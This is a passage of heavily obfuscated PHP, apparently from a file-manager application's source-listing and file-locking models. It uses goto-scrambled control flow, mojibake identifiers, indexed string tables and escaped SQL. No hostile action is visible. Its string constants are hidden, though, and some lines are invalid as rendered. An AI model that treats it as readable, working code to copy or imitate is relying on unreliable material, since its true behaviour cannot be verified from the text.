$B“­³º•[$C™¡ÚÄğçÁ[415]][$C™¡ÚÄğçÁ[462]] = array(); foreach ($aë‰½ƒÌ÷Ò[$B“­³º•[$C™¡ÚÄğçÁ[393]]] as $F×ˆæìè®†) { $B“­³º•[$C™¡ÚÄğçÁ[415]][$C™¡ÚÄğçÁ[462]] = array($C™¡ÚÄğçÁ[463] => $F×ˆæìè®†[$C™¡ÚÄğçÁ[464]], $C™¡ÚÄğçÁ[465] => $F×ˆæìè®†[$C™¡ÚÄğçÁ[466]], $C™¡ÚÄğçÁ[467] => $F×ˆæìè®†[$C™¡ÚÄğçÁ[393]], $C™¡ÚÄğçÁ[468] => $F×ˆæìè®†[$C™¡ÚÄğçÁ[469]], $C™¡ÚÄğçÁ[470] => $F×ˆæìè®†[$C™¡ÚÄğçÁ[471]], $C™¡ÚÄğçÁ[472] => $F×ˆæìè®†[$C™¡ÚÄğçÁ[472]], $C™¡ÚÄğçÁ[473] => $F×ˆæìè®†[$C™¡ÚÄğçÁ[473]]); } } } unset($B“­³º•); goto FÆ ‚ŒŠïÔ; bùƒÇëäÛÄ: $C™¡ÚÄğçÁ =& $_SERVER[±á õÁ]; if (!defined($C™¡ÚÄğçÁ[450])) { return; } $EÉ‚Ï¶âø = Model($C™¡ÚÄğçÁ[451])->listData(); goto c¡ï»ÓáÚÁ; FÆ ‚ŒŠïÔ: return $f¶‰ì ÎÜ‰; goto D‡ìæé¹Ô‚; D‡ìæé¹Ô‚: } protected function _listAppendChildren(&$Bª‰ÈÁÙÜĞ, $BÊëÍ¨á‘¢) { goto dİôÉÏ³¨×; dİôÉÏ³¨×: $DÔïá®¯Å =& $_SERVER[±á õÁ]; $aŠéõ“µĞÁ = $DÔïá®¯Å[18]; $bèó¸™´÷á = array(); goto a˜ÇëÅÒ¤; F×Úì•Ô°Ç: $Bë¬ÔÜ´Õ™ = $this->tablePrefix . $this->tableName; for ($f¿ºÒãù‹Ã = 0; $f¿ºÒãù‹Ã < $Fß†“¾Ëî; $f¿ºÒãù‹Ã++) { $E÷Ò‚Æ®ÂÜ = intval($Bª‰ÈÁÙÜĞ[$f¿ºÒãù‹Ã][$DÔïá®¯Å[421]]); if ($Bª‰ÈÁÙÜĞ[$f¿ºÒãù‹Ã][$DÔïá®¯Å[394]]) { $C“¤À¤Üó = $Bª‰ÈÁÙÜĞ[$f¿ºÒãù‹Ã][$DÔïá®¯Å[393]]; $aŠéõ“µĞÁ .= "\123\x45\114\105\x43\124\40\x2a\40\106\x52\x4f\115\x20\50\x53\x45\114\x45\x43\x54\x20\47{$C“¤À¤Üó}\x5f\150\x61\163\x46\x69\154\x65\47\x20\x61\163\x20\150\x61\x73\54\x63\157\165\156\164\50\61\51\x20\x61\163\x20\x68\141\163\103\157\x75\x6e\164\40\x46\x52\x4f\115\40\x60{$Bë¬ÔÜ´Õ™}\140\x20\12\11\11\x9\11\11\167\x68\145\x72\145\40\x70\x61\162\145\156\x74\111\x44\x3d{$C“¤À¤Üó}\x20\141\x6e\144\40\151\x73\x46\x6f\x6c\x64\x65\x72\x3d\x30\x20\x61\x6e\x64\40\151\163\x44\x65\154\145\x74\145\x3d{$E÷Ò‚Æ®ÂÜ}\x29\40\141\x73\40\164\x62\61\x5f{$C“¤À¤Üó}\x20\165\x6e\151\157\156\x20\141\154\x6c\x20\12\x9\11\11\11\x9\123\x45\114\105\103\124\x20\52\x20\x46\122\x4f\x4d\x20\50\x53\105\114\x45\x43\x54\40\x27{$C“¤À¤Üó}\137\150\141\163\106\157\154\x64\x65\x72\x27\40\141\163\40\150\x61\163\106\151\x6c\x65\54\143\157\x75\156\x74\50\x31\x29\40\141\x73\x20\150\x61\x73\103\x6f\165\156\x74\x20\x46\122\x4f\115\40\140{$Bë¬ÔÜ´Õ™}\x60\40\xa\x9\x9\11\x9\11\x77\150\145\162\x65\x20\x70\x61\x72\x65\156\164\x49\x44\75{$C“¤À¤Üó}\x20\x61\156\x64\x20\151\x73\x46\157\x6c\144\145\x72\x3d\61\40\x61\x6e\144\40\x69\x73\x44\x65\x6c\x65\x74\145\x3d{$E÷Ò‚Æ®ÂÜ}\x29\x20\x61\x73\x20\164\x62\x32\x5f{$C“¤À¤Üó}\40\165\156\151\157\x6e\x20\x61\154\154\x20"; } if ((strlen($aŠéõ“µĞÁ) >= $A–‚•öéäª || $f¿ºÒãù‹Ã == $Fß†“¾Ëî - 1) && $aŠéõ“µĞÁ) { $aŠéõ“µĞÁ = substr($aŠéõ“µĞÁ, 0, -strlen($DÔïá®¯Å[474])); $BÏê³ï¯· = $this->query($aŠéõ“µĞÁ); $bèó¸™´÷á = array_merge($bèó¸™´÷á, $BÏê³ï¯·); $aŠéõ“µĞÁ = $DÔïá®¯Å[43]; } } $bèó¸™´÷á = array_to_keyvalue($bèó¸™´÷á, $DÔïá®¯Å[475]); goto fƒĞ±Äº¹Ş; a˜ÇëÅÒ¤: $A–‚•öéäª = 1024 * 50; $Bª‰ÈÁÙÜĞ = is_array($Bª‰ÈÁÙÜĞ) ? $Bª‰ÈÁÙÜĞ : array(); $Fß†“¾Ëî = count($Bª‰ÈÁÙÜĞ); goto F×Úì•Ô°Ç; fƒĞ±Äº¹Ş: foreach ($Bª‰ÈÁÙÜĞ as &$EŒíê’ïèÚ) { if ($EŒíê’ïèÚ[$DÔïá®¯Å[394]]) { unset($EŒíê’ïèÚ[$DÔïá®¯Å[396]]); $EŒíê’ïèÚ[$DÔïá®¯Å[210]] = intval($bèó¸™´÷á[$EŒíê’ïèÚ[$DÔïá®¯Å[393]] . $DÔïá®¯Å[476]][$DÔïá®¯Å[477]]); $EŒíê’ïèÚ[$DÔïá®¯Å[209]] = intval($bèó¸™´÷á[$EŒíê’ïèÚ[$DÔïá®¯Å[393]] . $DÔïá®¯Å[478]][$DÔïá®¯Å[477]]); } } unset($EŒíê’ïèÚ); goto dĞÆÉ±¨ÈÆ; dĞÆÉ±¨ÈÆ: } protected function _listAppendAuth(&$F²Ï˜ÜºÀ‡) { goto aëøò–Ï£ƒ; aëøò–Ï£ƒ: $eİ ¹’µª† =& $_SERVER[±á õÁ]; if (!defined($eİ ¹’µª†[450])) { return; } $DØñ·—š¦İ = array(); goto dÌ¦¸ÚÜØ; c«åˆ‹½’: $a×àôœ” = Model($eİ ¹’µª†[479])->getSourceList($DØñ·—š¦İ, $aÑ‚øÎ–ï×); foreach ($F²Ï˜ÜºÀ‡ as $fæÃÍğ£…Œ => &$e›•²˜‚”¬) { $e›•²˜‚”¬[$eİ ¹’µª†[400]] = $a×àôœ”[$e›•²˜‚”¬[$eİ ¹’µª†[393]]]; if (!$e›•²˜‚”¬[$eİ ¹’µª†[400]] && $e›•²˜‚”¬[$eİ ¹’µª†[395]] == self::TYPE_GROUP) { $e›•²˜‚”¬[$eİ ¹’µª†[400]] = Action($eİ ¹’µª†[480])->pathGroupAuthMake($e›•²˜‚”¬[$eİ ¹’µª†[481]]); if (!$e›•²˜‚”¬[$eİ ¹’µª†[400]] && !_get($GLOBALS, $eİ ¹’µª†[482])) { $e›•²˜‚”¬[$eİ ¹’µª†[202]] = !1; $e›•²˜‚”¬[$eİ ¹’µª†[201]] = !1; } } if ($e›•²˜‚”¬[$eİ ¹’µª†[400]]) { $e›•²˜‚”¬[$eİ ¹’µª†[202]] = AuthModel::authCheckEdit($e›•²˜‚”¬[$eİ ¹’µª†[400]][$eİ ¹’µª†[401]]); $e›•²˜‚”¬[$eİ ¹’µª†[201]] = AuthModel::authCheckView($e›•²˜‚”¬[$eİ ¹’µª†[400]][$eİ ¹’µª†[401]]); } $this->groupPathDisplay($e›•²˜‚”¬); } unset($e›•²˜‚”¬); goto d²È“ÖÆ; dÌ¦¸ÚÜØ: foreach ($F²Ï˜ÜºÀ‡ as $e›•²˜‚”¬) { if ($e›•²˜‚”¬[$eİ ¹’µª†[395]] == self::TYPE_GROUP) { $DØñ·—š¦İ[] = $e›•²˜‚”¬[$eİ ¹’µª†[393]]; } } if (!$DØñ·—š¦İ) { return; } $aÑ‚øÎ–ï× = array_to_keyvalue($F²Ï˜ÜºÀ‡, $eİ ¹’µª†[393]); goto c«åˆ‹½’; d²È“ÖÆ: } public function groupPathDisplay(&$d’òêÀÓ¦) { goto Eº®â³ìÛ¼; A÷˜ÖßŠÄ: $d’òêÀÓ¦[$a¼Úùæï«Ë[489]] = $e§ãè‰î . $bàé‹£Õœ[$a¼Úùæï«Ë[415]][$a¼Úùæï«Ë[393]]; goto e¡²‘Å¸Š•; BÛÇÜËÓ°: $d’òêÀÓ¦[$a¼Úùæï«Ë[485]] = $bàé‹£Õœ[$a¼Úùæï«Ë[486]]; $d’òêÀÓ¦[$a¼Úùæï«Ë[404]] = $bàé‹£Õœ[$a¼Úùæï«Ë[484]]; $d’òêÀÓ¦[$a¼Úùæï«Ë[487]] = $bàé‹£Õœ[$a¼Úùæï«Ë[488]]; goto A÷˜ÖßŠÄ; B¹îÀƒç»é: $fˆÊ¿ÙÌ¢Š = $this->parentLevelArray($bàé‹£Õœ[$a¼Úùæï«Ë[484]]); $e§ãè‰î = $a¼Úùæï«Ë[43]; foreach ($fˆÊ¿ÙÌ¢Š as $C¹Ë“„ÓÈ) { $aë¬õ¥ø‹† = Model($a¼Úùæï«Ë[483])->getInfo($C¹Ë“„ÓÈ); $e§ãè‰î .= $aë¬õ¥ø‹†[$a¼Úùæï«Ë[415]][$a¼Úùæï«Ë[393]] . $a¼Úùæï«Ë[57]; } goto BÛÇÜËÓ°; Eº®â³ìÛ¼: $a¼Úùæï«Ë =& $_SERVER[±á õÁ]; if ($d’òêÀÓ¦[$a¼Úùæï«Ë[395]] != self::TYPE_GROUP) { return; } $bàé‹£Õœ = Model($a¼Úùæï«Ë[483])->getInfo($d’òêÀÓ¦[$a¼Úùæï«Ë[481]]); goto B¹îÀƒç»é; e¡²‘Å¸Š•: } protected function _listAppendPath(&$AƒåİßÅ×ˆ) { goto b®ƒŸ· è´; b®ƒŸ· è´: $d…Ë¬·ªÖÆ =& $_SERVER[±á õÁ]; static $a´²“ÑêŠ = array(); $eá¨›«Ê°ó = array(); goto f—öçÑïÃØ; f—öçÑïÃØ: foreach ($AƒåİßÅ×ˆ as &$B‰ˆ¦ùè‰) { $a´²“ÑêŠ[$B‰ˆ¦ùè‰[$d…Ë¬·ªÖÆ[393]]] = $B‰ˆ¦ùè‰[$d…Ë¬·ªÖÆ[38]]; $eã‘Ÿ¥ë­ = $this->parentLevelArray($B‰ˆ¦ùè‰[$d…Ë¬·ªÖÆ[484]]); foreach ($eã‘Ÿ¥ë­ as $eÊ°ÊÉÖ¯ç => $Fà–Ëï¹—³) { if ($eÊ°ÊÉÖ¯ç != 0 && !isset($a´²“ÑêŠ[$Fà–Ëï¹—³])) { $eá¨›«Ê°ó[] = $Fà–Ëï¹—³; } } } unset($B‰ˆ¦ùè‰); if (count($eá¨›«Ê°ó) > 0) { $a†Úœ„‚° = array($d…Ë¬·ªÖÆ[407] => array($d…Ë¬·ªÖÆ[408], $eá¨›«Ê°ó)); if (count($eá¨›«Ê°ó) == 1) { $D×ˆ“ç‡«¤ = $this->sourceInfo($eá¨›«Ê°ó[0]); $bÜ‹„é‘±Ô = is_array($D×ˆ“ç‡«¤) ? array($D×ˆ“ç‡«¤) : !1; } else { $bÜ‹„é‘±Ô = $this->field($d…Ë¬·ªÖÆ[490])->where($a†Úœ„‚°)->select(); } $aÌÉöÈÇÂ’ = array_to_keyvalue($bÜ‹„é‘±Ô, $d…Ë¬·ªÖÆ[393], $d…Ë¬·ªÖÆ[38]); $a´²“ÑêŠ = array_merge_index($a´²“ÑêŠ, $aÌÉöÈÇÂ’); } goto EĞ™ë‡…÷Ú; EĞ™ë‡…÷Ú: $eÖ¥ß¦·­… = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); foreach ($AƒåİßÅ×ˆ as &$B‰ˆ¦ùè‰) { goto f„‘İ†óĞË; D‹‚¯îÙÃ÷: if ($eã‘Ÿ¥ë­) { $FÛÍëÖ .= $B‰ˆ¦ùè‰[$d…Ë¬·ªÖÆ[38]]; } if ($B‰ˆ¦ùè‰[$d…Ë¬·ªÖÆ[394]]) { $FÛÍëÖ .= $d…Ë¬·ªÖÆ[8]; } $B‰ˆ¦ùè‰[$d…Ë¬·ªÖÆ[491]] = str_replace($d…Ë¬·ªÖÆ[492], $d…Ë¬·ªÖÆ[8], $FÛÍëÖ); goto f„»Ô«µ”á; f„‘İ†óĞË: $eã‘Ÿ¥ë­ = $this->parentLevelArray($B‰ˆ¦ùè‰[$d…Ë¬·ªÖÆ[484]]); $FÛÍëÖ = $this->_listAppendPathRoot($B‰ˆ¦ùè‰, $eã‘Ÿ¥ë­); foreach ($eã‘Ÿ¥ë­ as $eÊ°ÊÉÖ¯ç => $Fà–Ëï¹—³) { if ($eÊ°ÊÉÖ¯ç == 0 && $FÛÍëÖ && $B‰ˆ¦ùè‰[$d…Ë¬·ªÖÆ[395]] == self::TYPE_GROUP) { continue; } if (isset($a´²“ÑêŠ[$Fà–Ëï¹—³])) { $FÛÍëÖ .= $a´²“ÑêŠ[$Fà–Ëï¹—³] . $d…Ë¬·ªÖÆ[8]; } } goto D‹‚¯îÙÃ÷; f„»Ô«µ”á: $D±·‚Ê†ÓŞ = trim($B‰ˆ¦ùè‰[$d…Ë¬·ªÖÆ[491]], $d…Ë¬·ªÖÆ[8]); if ($B‰ˆ¦ùè‰[$d…Ë¬·ªÖÆ[486]] == $d…Ë¬·ªÖÆ[493] && $D±·‚Ê†ÓŞ) { $B‰ˆ¦ùè‰[$d…Ë¬·ªÖÆ[38]] = $D±·‚Ê†ÓŞ; } $this->_listAppendPathRecycle($B‰ˆ¦ùè‰, $eã‘Ÿ¥ë­, $eÖ¥ß¦·­…); goto C©„Õ¡ëë¶; C©„Õ¡ëë¶: } unset($B‰ˆ¦ùè‰); goto bÄÛ†åÆÉã; bÄÛ†åÆÉã: return $AƒåİßÅ×ˆ; goto aó—‚¹ŞÒé; aó—‚¹ŞÒé: } private function _listAppendPathRecycle(&$døÃéäÚÏ¹, $eÄ©ê¥†˜Ì, $d‘ê‡ÈßªÖ) { goto d×§¹ŸàĞ; d×§¹ŸàĞ: $A»Ğ´µ¿Å =& $_SERVER[±á õÁ]; if (intval($døÃéäÚÏ¹[$A»Ğ´µ¿Å[395]]) !== self::TYPE_SYSTEM) { return; } if (!in_array($d‘ê‡ÈßªÖ, $eÄ©ê¥†˜Ì) && $døÃéäÚÏ¹[$A»Ğ´µ¿Å[393]] != $d‘ê‡ÈßªÖ) { return; } goto d½ˆö‰äÇø; f˜¦……œğ: $døÃéäÚÏ¹[$A»Ğ´µ¿Å[484]] = $A»Ğ´µ¿Å[495] . implode($A»Ğ´µ¿Å[57], array_slice($eÄ©ê¥†˜Ì, 1)) . $A»Ğ´µ¿Å[57]; if ($døÃéäÚÏ¹[$A»Ğ´µ¿Å[393]] == $d‘ê‡ÈßªÖ) { $døÃéäÚÏ¹[$A»Ğ´µ¿Å[484]] = $A»Ğ´µ¿Å[495]; $døÃéäÚÏ¹[$A»Ğ´µ¿Å[486]] = $A»Ğ´µ¿Å[493]; $døÃéäÚÏ¹[$A»Ğ´µ¿Å[38]] = LNG($A»Ğ´µ¿Å[494]); } $døÃéäÚÏ¹[$A»Ğ´µ¿Å[496]] = $A»Ğ´µ¿Å[497]; goto D†…¸¶ˆÏ·; d½ˆö‰äÇø: $eÖŞóÀàØ = explode($A»Ğ´µ¿Å[8], trim($døÃéäÚÏ¹[$A»Ğ´µ¿Å[491]], $A»Ğ´µ¿Å[8])); $c§™¾‚öëµ = implode($A»Ğ´µ¿Å[8], array_slice($eÖŞóÀàØ, 2)); $døÃéäÚÏ¹[$A»Ğ´µ¿Å[491]] = $A»Ğ´µ¿Å[8] . LNG($A»Ğ´µ¿Å[494]) . $A»Ğ´µ¿Å[8] . ltrim($c§™¾‚öëµ, $A»Ğ´µ¿Å[8]); goto f˜¦……œğ; D†…¸¶ˆÏ·: } protected function _listAppendPathRoot(&$f‡õç÷”ô, $aÆ¼¨õ®©») { $F¢¶ç—ºê =& $_SERVER[±á õÁ]; $cŒÌ”‹¡¡Â = $F¢¶ç—ºê[43]; if ($f‡õç÷”ô[$F¢¶ç—ºê[395]] == self::TYPE_USER) { if (defined($F¢¶ç—ºê[450]) && $f‡õç÷”ô[$F¢¶ç—ºê[481]] == USER_ID) { $cŒÌ”‹¡¡Â = LNG($F¢¶ç—ºê[498]); if (!$aÆ¼¨õ®©») { $f‡õç÷”ô[$F¢¶ç—ºê[38]] = $cŒÌ”‹¡¡Â; } } else { $e†³Œ¥¦½ = Model($F¢¶ç—ºê[499])->getInfoSimple($f‡õç÷”ô[$F¢¶ç—ºê[481]]); $cŒÌ”‹¡¡Â = LNG($F¢¶ç—ºê[500]) . $F¢¶ç—ºê[167] . $e†³Œ¥¦½[$F¢¶ç—ºê[38]] . $F¢¶ç—ºê[501]; } } else { if ($f‡õç÷”ô[$F¢¶ç—ºê[395]] == self::TYPE_GROUP) { $e†³Œ¥¦½ = Model($F¢¶ç—ºê[483])->getInfoSimple($f‡õç÷”ô[$F¢¶ç—ºê[481]]); $cŒÌ”‹¡¡Â = $e†³Œ¥¦½[$F¢¶ç—ºê[38]]; } else { if ($f‡õç÷”ô[$F¢¶ç—ºê[395]] == self::TYPE_SYSTEM) { $e†³Œ¥¦½ = $this->sourceInfo($aÆ¼¨õ®©»[0], !0); $cŒÌ”‹¡¡Â = $e†³Œ¥¦½[$F¢¶ç—ºê[38]]; } } } $cŒÌ”‹¡¡Â = $cŒÌ”‹¡¡Â ? $F¢¶ç—ºê[8] . $cŒÌ”‹¡¡Â . $F¢¶ç—ºê[8] : $F¢¶ç—ºê[8]; return $cŒÌ”‹¡¡Â; } protected function _listAppendUser(&$AœÅ°ƒ±íÃ) { goto cÜÉÀèº¾; cÜÉÀèº¾: $cÈóí—– =& $_SERVER[±á õÁ]; $C¶„×ÂØ¯¢ = array_to_keyvalue($AœÅ°ƒ±íÃ, $cÈóí—–[43], $cÈóí—–[402]); $dé‡µİ‹œ = array_to_keyvalue($AœÅ°ƒ±íÃ, $cÈóí—–[43], $cÈóí—–[403]); goto EÓù™”ÓÇô; EÓù™”ÓÇô: $aï“‰Ñè´ = array_merge($C¶„×ÂØ¯¢, $dé‡µİ‹œ); $eÜÑÌšˆŠ‹ = Model($cÈóí—–[502])->userListInfo($aï“‰Ñè´); foreach ($AœÅ°ƒ±íÃ as &$eëŒ‰êŠù‘) { $c˜İæñîÄÌ = $eëŒ‰êŠù‘[$cÈóí—–[402]]; $eëŒ‰êŠù‘[$cÈóí—–[402]] = $eÜÑÌšˆŠ‹[$c˜İæñîÄÌ] ? $eÜÑÌšˆŠ‹[$c˜İæñîÄÌ] : !1; $c˜İæñîÄÌ = $eëŒ‰êŠù‘[$cÈóí—–[403]]; $eëŒ‰êŠù‘[$cÈóí—–[403]] = $eÜÑÌšˆŠ‹[$c˜İæñîÄÌ] ? $eÜÑÌšˆŠ‹[$c˜İæñîÄÌ] : !1; if (isset($eëŒ‰êŠù‘[$cÈóí—–[441]]) && $eëŒ‰êŠù‘[$cÈóí—–[441]][$cÈóí—–[503]]) { $Cæë¥ªÄ¼Æ = $GLOBALS[$cÈóí—–[6]][$cÈóí—–[94]][$cÈóí—–[504]]; if ($eëŒ‰êŠù‘[$cÈóí—–[441]][$cÈóí—–[505]] <= time() - $Cæë¥ªÄ¼Æ) { $this->metaSet($eëŒ‰êŠù‘[$cÈóí—–[393]], $cÈóí—–[503], null); $this->metaSet($eëŒ‰êŠù‘[$cÈóí—–[393]], $cÈóí—–[505], null); unset($eëŒ‰êŠù‘[$cÈóí—–[441]][$cÈóí—–[503]]); continue; } $D‚ï—·â“ = $eëŒ‰êŠù‘[$cÈóí—–[441]][$cÈóí—–[503]]; $eëŒ‰êŠù‘[$cÈóí—–[441]][$cÈóí—–[506]] = Model($cÈóí—–[502])->getInfoSimpleOuter($D‚ï—·â“); } } goto bÒ„ˆ¾·×‹; bÒ„ˆ¾·×‹: unset($eëŒ‰êŠù‘); goto AãÛİ–ù¥; AãÛİ–ù¥: } public function parentLevelArray($A‹¥ğ‡ÀÆ) { $céÇãÍ¯ëæ =& $_SERVER[±á õÁ]; $A‹¥ğ‡ÀÆ = explode($céÇãÍ¯ëæ[57], trim($A‹¥ğ‡ÀÆ, $céÇãÍ¯ëæ[57])); return array_remove_value($A‹¥ğ‡ÀÆ, $céÇãÍ¯ëæ[493]); } public function listAll($C¸Ó¿íÉÀä) { goto fª”ïĞôš«; D¾÷¢×‡¼å: $B£Ì˜„ÓÎë = array(); foreach ($C°º´øĞé• as $f–ñÂ÷‘š => $f×®’¢–ğ) { goto C“®Ïêåß; cÇ­Øè±÷¶: for ($f´¨İ’Œñ¹ = 0; $f´¨İ’Œñ¹ < count($A¾˜¯á¥Àˆ); $f´¨İ’Œñ¹++) { $bò”›²¿÷“ .= $C°º´øĞé•[$A¾˜¯á¥Àˆ[$f´¨İ’Œñ¹]][$báùÌçÖÉ™[38]] . $báùÌçÖÉ™[8]; } $bò”›²¿÷“ .= $f×®’¢–ğ[$báùÌçÖÉ™[38]]; if ($f×®’¢–ğ[$báùÌçÖÉ™[394]]) { $bò”›²¿÷“ .= $báùÌçÖÉ™[8]; } goto c‘×ç‡¼ƒğ; c‘×ç‡¼ƒğ: $bò”›²¿÷“ = str_replace($báùÌçÖÉ™[492], $báùÌçÖÉ™[8], $bò”›²¿÷“); $bò”›²¿÷“ = str_replace($báùÌçÖÉ™[492], $báùÌçÖÉ™[8], $bò”›²¿÷“); $bå‘äôÆîë = array($báùÌçÖÉ™[411] => str_replace($báùÌçÖÉ™[492], $báùÌçÖÉ™[8], $bò”›²¿÷“), $báùÌçÖÉ™[513] => intval($f×®’¢–ğ[$báùÌçÖÉ™[394]]), $báùÌçÖÉ™[415] => $this->pathInfoFilter($f×®’¢–ğ, !0)); goto Aà¢•–ù‚; Aà¢•–ù‚: if (!$f×®’¢–ğ[$báùÌçÖÉ™[394]]) { $bå‘äôÆîë[$báùÌçÖÉ™[443]] = $f×®’¢–ğ[$báùÌçÖÉ™[443]]; $bå‘äôÆîë[$báùÌçÖÉ™[514]] = $f×®’¢–ğ[$báùÌçÖÉ™[85]]; } $B£Ì˜„ÓÎë[] = $bå‘äôÆîë; goto CÂäÊïï¬â; C“®Ïêåß: $A¾˜¯á¥Àˆ = $this->parentLevelArray($f×®’¢–ğ[$báùÌçÖÉ™[484]]); array_shift($A¾˜¯á¥Àˆ); $bò”›²¿÷“ = $aºö‰¯¨âê; goto cÇ­Øè±÷¶; CÂäÊïï¬â: } return $B£Ì˜„ÓÎë; goto E‰ÏË³ó—; E—éµ‚ òÎ: $C…ÑÜ”Ú£ = $báùÌçÖÉ™[511]; $fË›…éê½ˆ = "\114\x45\x46\x54\x20\112\117\x49\116\x20{$this->tablePrefix}\x69\157\137\146\x69\x6c\x65\x20\146\x69\x6c\x65\40\157\156\40\163\157\x75\x72\143\x65\56\146\151\x6c\145\x49\x44\40\x3d\40\x66\151\154\x65\x2e\x66\151\x6c\145\111\104"; $C°º´øĞé• = $this->alias($báùÌçÖÉ™[512])->field($C…ÑÜ”Ú£)->where($eêÅÍ›Ûé³)->join($fË›…éê½ˆ)->select(); goto e…â·ê”; fª”ïĞôš«: $báùÌçÖÉ™ =& $_SERVER[±á õÁ]; $c°×ÕÄĞ = $this->sourceInfo($C¸Ó¿íÉÀä); $eêÅÍ›Ûé³ = array($báùÌçÖÉ™[507] => array($báùÌçÖÉ™[508], $c°×ÕÄĞ[$báùÌçÖÉ™[484]] . $C¸Ó¿íÉÀä . $báùÌçÖÉ™[509]), $báùÌçÖÉ™[510] => 0); goto E—éµ‚ òÎ; D‡ÄµÂ‡ØÙ: $C°º´øĞé• = array_to_keyvalue($C°º´øĞé•, $báùÌçÖÉ™[393]); $aºö‰¯¨âê = "\x2f{$c°×ÕÄĞ[$báùÌçÖÉ™[38]]}\57"; $aºö‰¯¨âê = $aºö‰¯¨âê == $báùÌçÖÉ™[492] ? $báùÌçÖÉ™[8] : $aºö‰¯¨âê; goto D¾÷¢×‡¼å; e…â·ê”: $this->_listAppendAuth($C°º´øĞé•); $this->_listAppendUser($C°º´øĞé•); $this->_listAppendPath($C°º´øĞé•); goto D‡ÄµÂ‡ØÙ; E‰ÏË³ó—: } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($Eë©ªÚÅé¾) { goto bÍ¨æ°Õí; bÍ¨æ°Õí: $E©‹šÏİâÌ =& $_SERVER[±á õÁ]; if (!$this->allowLock()) { return; } $this->_lockCheck($E©‹šÏİâÌ[515], $Eë©ªÚÅé¾); goto a»‹ÊàğÂ±; D Î¦‹…ä§: $this->_lockEvent($Eë©ªÚÅé¾, array($E©‹šÏİâÌ[518], $E©‹šÏİâÌ[519]), $c‡‚“ôØÔò); $this->_lockCheckEnd($E©‹šÏİâÌ[515], $Eë©ªÚÅé¾); goto A ÜºÌ‡; a»‹ÊàğÂ±: $c‡‚“ôØÔò = 1; $this->_lockEvent($Eë©ªÚÅé¾, array($E©‹šÏİâÌ[516], $E©‹šÏİâÌ[517]), $c‡‚“ôØÔò); $this->_lockParent($Eë©ªÚÅé¾, array($E©‹šÏİâÌ[517]), $c‡‚“ôØÔò); goto D Î¦‹…ä§; A ÜºÌ‡: } public function lockCopyEnd($E‰ùŒ“œà˜) { $FÌ ´ÊâšÎ =& $_SERVER[±á õÁ]; if (!$this->allowLock()) { return; } $Fœ£¡­ºİï = 0; $this->_lockEvent($E‰ùŒ“œà˜, array($FÌ ´ÊâšÎ[516], $FÌ ´ÊâšÎ[517]), $Fœ£¡­ºİï); $this->_lockParent($E‰ùŒ“œà˜, array($FÌ ´ÊâšÎ[517]), $Fœ£¡­ºİï); $this->_lockEvent($E‰ùŒ“œà˜, array($FÌ ´ÊâšÎ[518], $FÌ ´ÊâšÎ[519]), $Fœ£¡­ºİï); } public function lockWriteStart($dé³¸õòÊ÷, $cç ÃñïÃ = '') { goto E‹Ê½Œ°‡˜; d©—Î©„¶: $Eœ‹Ğƒ×‰‰ = 1; $this->_lockKey($B‰ÕŞİÈ¡[520] . $dé³¸õòÊ÷ . $B‰ÕŞİÈ¡[101] . $cç ÃñïÃ, $Eœ‹Ğƒ×‰‰); $this->_lockEvent($dé³¸õòÊ÷, array($B‰ÕŞİÈ¡[515], $B‰ÕŞİÈ¡[517]), $Eœ‹Ğƒ×‰‰); goto C°Ê±Ú£‡Ú; E‹Ê½Œ°‡˜: $B‰ÕŞİÈ¡ =& $_SERVER[±á õÁ]; if (!$this->allowLock()) { return; } $this->_lockCheck($B‰ÕŞİÈ¡[516], $dé³¸õòÊ÷); goto d©—Î©„¶; C°Ê±Ú£‡Ú: $this->_lockParent($dé³¸õòÊ÷, array($B‰ÕŞİÈ¡[515], $B‰ÕŞİÈ¡[517]), $Eœ‹Ğƒ×‰‰); $this->_lockCheckEnd($B‰ÕŞİÈ¡[516], $dé³¸õòÊ÷); goto BÍ‡ÒšÒë¢; BÍ‡ÒšÒë¢: } public function lockWriteEnd($C©°áôó‚Ú, $FŠĞ¼ïËµÇ = '') { $aè‹ŸŠ®éƒ =& $_SERVER[±á õÁ]; if (!$this->allowLock()) { return; } $bÚ‚Áï©Èê = 0; $this->_lockKey($aè‹ŸŠ®éƒ[520] . $C©°áôó‚Ú . $aè‹ŸŠ®éƒ[101] . $FŠĞ¼ïËµÇ, $bÚ‚Áï©Èê); $this->_lockEvent($C©°áôó‚Ú, array($aè‹ŸŠ®éƒ[515], $aè‹ŸŠ®éƒ[517]), $bÚ‚Áï©Èê); $this->_lockParent($C©°áôó‚Ú, array($aè‹ŸŠ®éƒ[515], $aè‹ŸŠ®éƒ[517]), $bÚ‚Áï©Èê); } public function lockMoveStart($aÊ‡²”Ôå“) { goto fÜ•àŒ™íÊ; fÜ•àŒ™íÊ: $C±‰éŸË‚â =& $_SERVER[±á õÁ]; if (!$this->allowLock()) { return; } $this->_lockCheck($C±‰éŸË‚â[517], $aÊ‡²”Ôå“); goto B÷×ÇäÅ¹õ; dÃ·ÌÛ‚¯¼: $this->_lockParent($aÊ‡²”Ôå“, array($C±‰éŸË‚â[515], $C±‰éŸË‚â[517]), $b¢Š®†óã); $this->_lockEvent($aÊ‡²”Ôå“, array($C±‰éŸË‚â[522], $C±‰éŸË‚â[518], $C±‰éŸË‚â[519]), $b¢Š®†óã); $this->_lockCheckEnd($C±‰éŸË‚â[517], $aÊ‡²”Ôå“); goto DÏ‰Ò»•¡; B÷×ÇäÅ¹õ: $b¢Š®†óã = 1; $this->_lockKey($C±‰éŸË‚â[521] . $aÊ‡²”Ôå“, $b¢Š®†óã); $this->_lockEvent($aÊ‡²”Ôå“, array($C±‰éŸË‚â[515], $C±‰éŸË‚â[516]), $b¢Š®†óã); goto dÃ·ÌÛ‚¯¼; DÏ‰Ò»•¡: } public function lockMoveEnd($A°àÀ—Ò³) { goto cõÅŒ¶ëßÊ; B¦ÁÅìÎ…·: $this->_lockEvent($A°àÀ—Ò³, array($B¬è‡Ïô­Ø[522], $B¬è‡Ïô­Ø[518], $B¬è‡Ïô­Ø[519]), $bˆ†Ç‰‘ÜÁ); goto bùÍªï»›´; FÂ†éêóœ§: $this->_lockKey($B¬è‡Ïô­Ø[521] . $A°àÀ—Ò³, $bˆ†Ç‰‘ÜÁ); $this->_lockEvent($A°àÀ—Ò³, array($B¬è‡Ïô­Ø[515], $B¬è‡Ïô­Ø[516]), $bˆ†Ç‰‘ÜÁ); $this->_lockParent($A°àÀ—Ò³, array($B¬è‡Ïô­Ø[515], $B¬è‡Ïô­Ø[517]), 